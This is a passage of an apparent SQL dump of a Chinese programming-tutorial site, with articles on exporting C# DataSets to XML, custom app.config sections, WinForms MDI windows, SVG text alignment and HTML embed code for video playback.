false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //导出到XML(整个数据源)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void ExportTOXML()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (gridView.Rows.Count == 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox.Show(&quot;没有数据可供导出！&quot;, &quot;提示&quot;, MessageBoxButtons.OK, MessageBoxIcon.Information);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.Filter = &quot;XML files (*.xml)|*.xml&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.FilterIndex = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.RestoreDirectory = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //saveFileDialog2.CreatePrompt = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.Title = &quot;导出文件保存路径&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.FileName = null;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.ShowDialog();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string FileName =&nbsp; saveFileDialog2.FileName;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (FileName.Length != 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Visible = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objSet.WriteXml(saveFileDialog2.FileName.ToString());</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; objSet.Tables[0].Rows.Count; i++)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Value += 100 / objSet.Tables[0].Rows.Count;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox.Show(&quot;数据已经成功导出到：&quot; + saveFileDialog2.FileName.ToString(), &quot;导出完成&quot;, MessageBoxButtons.OK, MessageBoxIcon.Information);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Value = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Visible = false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n',0,1438312536,0,0),(120,38,'C# 自定义应用程序配置文件(上)','<p>自定义应用程序配置文件（app.config）http://www.sina.com.cn 2008年07月02日 09:59 IT168.com<br />\r\n【IT168技术文档】<br />\r\n&nbsp; 配置文件概述：<br />\r\n&nbsp; 应用程序配置文件是标准的 XML 文件，XML 标记和属性是区分大小写的。它是可以按需要更改的，开发人员可以使用配置文件来更改设置，而不必重编译应用程序。配置文件的根节点是configuration。我们经常访问的是appSettings，它是由.Net预定义配置节。我们经常使用的配置文件的架构是象下面的形式。先大概有个印象，通过后面的实例会有一个比较清楚的认识。下面的&ldquo;配置节&rdquo;可以理解为进行配置一个XML的节点。<br />\r\n&nbsp; 常见配置文件模式：&lt;configuration&gt;&lt;configSections&gt;//配置节声明区域，包含配置节和命名空间声明&lt;section&gt;//配置节声明 &lt;sectionGroup&gt;//定义配置节组 &lt;section&gt;//配置节组中的配置节声明&lt;appSettings&gt;//预定义配置节&lt;Custom element for configuration section&gt;//配置节设置区域&nbsp; 只有appSettings节的配置文件及访问方法<br />\r\n&nbsp; 下面是一个最常见的应用程序配置文件的例子，只有appSettings节。<br />\r\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;configuration&gt;&lt;appSettings&gt;&lt;add key=&quot;connectionstring&quot; value=&quot;User ID=sa;Data Source=.;Password=;Initial Catalog=test;Provider=SQLOLEDB.1;&quot;/&gt;&lt;add key=&quot;TemplatePATH&quot; value=&quot;Template&quot;/&gt;&lt;/appSettings&gt;&lt;/configuration&gt;&nbsp; 下面来看看这样的配置文件如何方法。<br />\r\n&nbsp; string _connectionString=ConfigurationSettings.AppSettings[&quot;connectionstring&quot;];<br />\r\n&nbsp; 使用ConfigurationSettings类的静态属性AppSettings就可以直接方法配置文件中的配置信息。这个属性的类型是NameValueCollection。<br />\r\n&nbsp; 自定义配置文件<br />\r\n&nbsp; 自定义配置节<br />\r\n&nbsp; 一个用户自定义的配置节，在配置文件中分为两部分：一是在&lt;configSections&gt;&lt;/ configSections&gt;配置节中声明配置节（上面配置文件模式中的&ldquo;&lt;section&gt;&rdquo;），另外是在&lt;configSections&gt;&lt;/ configSections &gt;之后设置配置节（上面配置文件模式中的&ldquo;&lt;Custom element for configuration section&gt;&rdquo;），有点类似一个变量先声明，后使用一样。声明一个配置文件的语句如下：<br />\r\n&lt;section name=&quot; &quot; type=&quot; &quot;/&gt;&nbsp; &lt;section&gt;：声明新配置节，即可创建新配置节。</p>\r\n\r\n<p>&nbsp; name：自定义配置节的名称。</p>\r\n\r\n<p>&nbsp; type：自定义配置节的类型，主要包括System.Configuration.SingleTagSectionHandler、&nbsp;&nbsp; System.Configuration.DictionarySectionHandler、 System.Configuration.NameValueSectionHandler。<br />\r\n&nbsp; 不同的type不但设置配置节的方式不一样，最后访问配置文件的操作上也有差异。下面我们就举一个配置文件的例子，让它包含这三个不同的type。<br />\r\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;configuration&gt;&lt;configSections&gt;&lt;section name=&quot;Test1&quot; type=&quot;System.Configuration.SingleTagSectionHandler&quot;/&gt;&lt;section name=&quot;Test2&quot; type=&quot;System.Configuration.DictionarySectionHandler&quot;/&gt;&lt;section name=&quot;Test3&quot; type=&quot;System.Configuration.NameValueSectionHandler&quot;/&gt;&lt;/configSections&gt;&lt;Test1 setting1=&quot;Hello&quot; setting2=&quot;World&quot;/&gt;&lt;Test2&gt;&lt;add key=&quot;Hello&quot; value=&quot;World&quot;/&gt;&lt;/Test2&gt;&lt;Test3&gt;&lt;add key=&quot;Hello&quot; value=&quot;World&quot;/&gt;&lt;/Test3&gt;&lt;/configuration&gt;&nbsp; 我们对上面的自定义配置节进行说明。在声明部分使用&lt;section name=&quot;Test1&quot; type=&quot;System.Configuration.SingleTagSectionHandler&quot;/&gt;声明了一个配置节它的名字叫Test1，类型为SingleTagSectionHandler。在设置配置节部分使用 &lt;Test1 setting1=&quot;Hello&quot; setting2=&quot;World&quot;/&gt;设置了一个配置节，它的第一个设置的值是Hello，第二个值是World，当然还可以有更多。其它的两个配置节和这个类似。</p>\r\n',0,1438312653,0,0),(121,38,'C#自定义应用程序配置文件(下)','<p>下面我们看在程序中如何访问这些自定义的配置节。我们用过ConfigurationSettings类的静态方法GetConfig来获取自定义配置节的信息。</p>\r\n\r\n<p>public static object GetConfig(string sectionName);</p>\r\n\r\n<p>下面是访问这三个配置节的代码：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731111949987145.jpg\" style=\"height:255px; width:701px\" /></p>\r\n\r\n<p>自定义配置节组</p>\r\n\r\n<p>配置节组是使用&lt;sectionGroup&gt;元素，将类似的配置节分到同一个组中。配置节组声明部分将创建配置节的包含元素，在&lt;configSections&gt;元素中声明配置节组，并将属于该组的节置于&lt;sectionGroup&gt;元素中。下面是一个包含配置节组的配置文件的例子：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731112026661483.jpg\" style=\"height:123px; width:697px\" /></p>\r\n',0,1438312842,0,0),(122,38,'c# 建立多窗口界面(MDI)方法','<p>傳統上，可以為Windows編寫3種應用程序，它們是：<br />\r\n&nbsp; 1）基於對話框的應用程序，它們給用戶顯示一個對話框，該 對話框提供了所有的功能。如計算器<br />\r\n&nbsp; 2）單一文檔界面（SDI），這些應用程序給用戶顯示一個菜單、一個或多個工具欄和一個窗口，在該窗口中，用戶可以執行任務。如WordPad<br />\r\n&nbsp; 3）多文檔界面（MDI），這些應用程序的執行方式與SDI相同，但可以同時打開多個窗口。</p>\r\n\r\n<p>&nbsp; MDI應用程序至少要由兩個截然不同的窗口組成。第一個窗口叫作MDI容器（Container）,第二個為 可以在容器中顯示的窗口叫作MDI子窗口。創建MDI時，只需把窗體的IsMdiContainer屬性設為True即可。<br />\r\n創建子窗體時，要把這個窗體的MdiParent屬性設置為主窗口的一個引用，該窗體就變成子窗體了。不能通過Properties面板設置這個屬性，只能通過代碼來設置。</p>\r\n\r\n<p>&nbsp; 建立MDI的方法<br />\r\n&nbsp; 1、建立兩個窗體。將其中的一個作為主窗體的IsMdiContainer屬性設為True。<br />\r\n&nbsp; 2、將作為子窗體的窗體構造函數中傳入主窗體。並將MdiParent設為傳為的主窗體，<br />\r\n&nbsp; 3、在主窗體中呼叫子窗體。</p>\r\n\r\n<p><br />\r\n&nbsp; 示例：<br />\r\n&nbsp; 注：下面代碼中的序號與上面建立方法的序號對應</p>\r\n\r\n<p>&nbsp; 1、建立兩個窗體：frmContainer窗體，作為主窗體；frmChild窗體，為作子窗體。</p>\r\n\r\n<p><br />\r\n&nbsp; frmContainer代碼：</p>\r\n\r\n<p>namespace MdiBasic</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; public partial class frmContainer : Form</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public frmContainer()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InitializeComponent();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //1、將窗體設為主窗體容器</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IsMdiContainer = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //3、顯示子窗體</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MdiBasic.frmChild child = new frmChild(this);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; child.Show();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>frmChild代碼：</p>\r\n\r\n<p>namespace MdiBasic</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; public partial class frmChild : Form</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //2、傳入主窗體</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public frmChild(MdiBasic.frmContainer parent)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InitializeComponent();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //2、將子窗體注冊到容器中</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.MdiParent = parent;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n',0,1438312952,0,0),(123,40,'矢量文本图形-SVG专题教程 文字','<p>源代码:</p>\r\n\r\n<p>＜?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?＞<br />\r\n＜!-- Author : Blueknight,Hangzhou,China 2000 --＞<br />\r\n＜svg width=&quot;50&quot; height=&quot;50&quot;＞<br />\r\n＜text x=&quot;0&quot; y=&quot;20&quot; style=&quot;fill: red&quot;＞<br />\r\nSVG<br />\r\n＜/text＞<br />\r\n＜/svg＞<br />\r\n&nbsp; 讲解: 在SVG中使用＜text＞＜/text＞标签定义文字.</p>\r\n\r\n<p>x,y属性决定文字的位置.＜text＞默认为文字居左对齐.也就是文字的轴线在文字的最左边线,图中,取轴线为x=0,与画布的最左边线一致,我们看到文字居左对齐.</p>\r\n\r\n<p>(另:关于中文字体以及编码格式,我们将在以后的专题中再做讨论.目前范例仍然使用默认的英文字体.)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>源代码:</p>\r\n\r\n<p>＜?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?＞<br />\r\n＜!-- Author : Blueknight,Hangzhou,China 2000 --＞<br />\r\n＜svg width=&quot;50&quot; height=&quot;50&quot;＞<br />\r\n＜text x=&quot;50&quot; y=&quot;13&quot; style=&quot;fill: red; text-anchor: middle&quot;＞<br />\r\nSVG<br />\r\n＜/text＞<br />\r\n＜/svg＞<br />\r\n&nbsp; 讲解: 居中对齐也就是文字的轴线在文字的中心.图中取x=50为轴线,我们很清楚的看到,轴线落在文字的中心.(另半边由于落在图像画布外,所以没有显示.)</p>\r\n\r\n<p>居中对齐使用了text-anchor: middle这一属性.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><br />\r\n源代码:</p>\r\n\r\n<p>＜?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?＞<br />\r\n＜!-- Author : Blueknight,Hangzhou,China 2000 --＞<br />\r\n＜svg width=&quot;50&quot; height=&quot;50&quot;＞<br />\r\n＜text x=&quot;50&quot; y=&quot;13&quot; style=&quot;fill: red; text-anchor: end&quot;＞<br />\r\nSVG<br />\r\n＜/text＞<br />\r\n＜/svg＞<br />\r\n&nbsp; 讲解: 居右对齐也就是文字的轴线在文字的最右边线.图中取x=50为轴线,与画布的最右边线一致.我们很清楚的看到,轴线落在文字的最右边.</p>\r\n\r\n<p>居中对齐使用了text-anchor: end这一属性.</p>\r\n',0,1438313046,0,0),(124,13,'HTML播放视频代码','<p>1.avi格式</p>\r\n\r\n<p>&lt;object id=&quot;video&quot; width=&quot;400&quot; height=&quot;200&quot; border=&quot;0&quot; classid=&quot;clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA&quot;&gt;<br />\r\n&lt;param name=&quot;ShowDisplay&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;ShowControls&quot; value=&quot;1&quot;&gt;<br />\r\n&lt;param name=&quot;AutoStart&quot; value=&quot;1&quot;&gt;<br />\r\n&lt;param name=&quot;AutoRewind&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;PlayCount&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;Appearance value=&quot;0 value=&quot;&quot;&quot;&gt;<br />\r\n&lt;param name=&quot;BorderStyle value=&quot;0 value=&quot;&quot;&quot;&gt;<br />\r\n&lt;param name=&quot;MovieWindowHeight&quot; value=&quot;240&quot;&gt;<br />\r\n&lt;param name=&quot;MovieWindowWidth&quot; value=&quot;320&quot;&gt;<br />\r\n&lt;param name=&quot;FileName&quot; value=&quot;影片URL路径&quot;&gt;<br />\r\n&lt;embed width=&quot;400&quot; height=&quot;200&quot; border=&quot;0&quot; showdisplay=&quot;0&quot; showcontrols=&quot;1&quot; autostart=&quot;1&quot; autorewind=&quot;0&quot; playcount=&quot;0&quot; moviewindowheight=&quot;240&quot; moviewindowwidth=&quot;320&quot; filename=&quot;file:///D|/work/vod/Mbar.avi&quot; src=&quot;Mbar.avi&quot;&gt;<br />\r\n&lt;/embed&gt;<br />\r\n&lt;/object&gt;</p>\r\n\r\n<p>2.mpg格式</p>\r\n\r\n<p>&lt;object classid=&quot;clsid:05589FA1-C356-11CE-BF01-00AA0055595A&quot; id=&quot;ActiveMovie1&quot; width=&quot;239&quot; height=&quot;250&quot;&gt;<br />\r\n&lt;param name=&quot;Appearance&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;AutoStart&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;AllowChangeDisplayMode&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;AllowHideDisplay&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;AllowHideControls&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;AutoRewind&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;Balance&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;CurrentPosition&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;DisplayBackColor&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;DisplayForeColor&quot; value=&quot;16777215&quot;&gt;<br />\r\n&lt;param name=&quot;DisplayMode&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;Enabled&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;EnableContextMenu&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;EnablePositionControls&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;EnableSelectionControls&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;EnableTracker&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;Filename&quot; value=&quot;影片URL路径&quot; valuetype=&quot;ref&quot;&gt;<br />\r\n&lt;param name=&quot;FullScreenMode&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;MovieWindowSize&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;PlayCount&quot; value=&quot;1&quot;&gt;<br />\r\n&lt;param name=&quot;Rate&quot; value=&quot;1&quot;&gt;<br />\r\n&lt;param name=&quot;SelectionStart&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;SelectionEnd&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;ShowControls&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;ShowDisplay&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;ShowPositionControls&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;ShowTracker&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;Volume&quot; value=&quot;-480&quot;&gt;<br />\r\n&lt;/object&gt;</p>\r\n\r\n<p>3.rm格式</p>\r\n\r\n<p>&lt;OBJECT ID=video1 CLASSID=&quot;clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA&quot; HEIGHT=288 WIDTH=352&gt;<br />\r\n&lt;param name=&quot;_ExtentX&quot; value=&quot;9313&quot;&gt;<br />\r\n&lt;param name=&quot;_ExtentY&quot; value=&quot;7620&quot;&gt;<br />\r\n&lt;param name=&quot;AUTOSTART&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;SHUFFLE&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;PREFETCH&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;NOLABELS&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;SRC&quot; value=&quot;影片URL路径(如:rtsp://121.14.89.14/vod/dawan-a.rm)&quot;;&gt;<br />\r\n&lt;param name=&quot;CONTROLS&quot; value=&quot;ImageWindow&quot;&gt;<br />\r\n&lt;param name=&quot;CONSOLE&quot; value=&quot;Clip1&quot;&gt;<br />\r\n&lt;param name=&quot;LOOP&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;NUMLOOP&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;CENTER&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;MAINTAINASPECT&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;BACKGROUNDCOLOR&quot; value=&quot;#000000&quot;&gt;&lt;embed SRC type=&quot;audio/x-pn-realaudio-plugin&quot; CONSOLE=&quot;Clip1&quot; CONTROLS=&quot;ImageWindow&quot; HEIGHT=&quot;288&quot; WIDTH=&quot;352&quot; AUTOSTART=&quot;false&quot;&gt;<br />\r\n&lt;/OBJECT&gt;</p>\r\n\r\n<p>4.wmv格式</p>\r\n\r\n<p>&lt;object id=&quot;NSPlay&quot; width=200 height=180 classid=&quot;CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95&quot; codebase=&quot;http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=6,4,5,715&quot; standby=&quot;Loading Microsoft Windows Media Player components...&quot; type=&quot;application/x-oleobject&quot; align=&quot;right&quot; hspace=&quot;5&quot;&gt;<br />\r\n&lt;!-- ASX File Name --&gt;<br />\r\n&lt;param name=&quot;AutoRewind&quot; value=1&gt;<br />\r\n&lt;param name=&quot;FileName&quot; value=&quot;影片URL路径&quot;&gt;<br />\r\n&lt;!-- Display Controls --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;ShowControls&quot; value=&quot;1&quot;&gt;<br />\r\n&lt;!-- Display Position Controls --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;ShowPositionControls&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Display Audio Controls --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;ShowAudioControls&quot; value=&quot;1&quot;&gt;<br />\r\n&lt;!-- Display Tracker Controls --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;ShowTracker&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Show Display --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;ShowDisplay&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Display Status Bar --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;ShowStatusBar&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Diplay Go To Bar --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;ShowGotoBar&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Display Controls --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;ShowCaptioning&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Player Autostart --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;AutoStart&quot; value=1&gt;<br />\r\n&lt;!-- Animation at Start --&gt;</p>\r\n\r\n<p>&lt;param 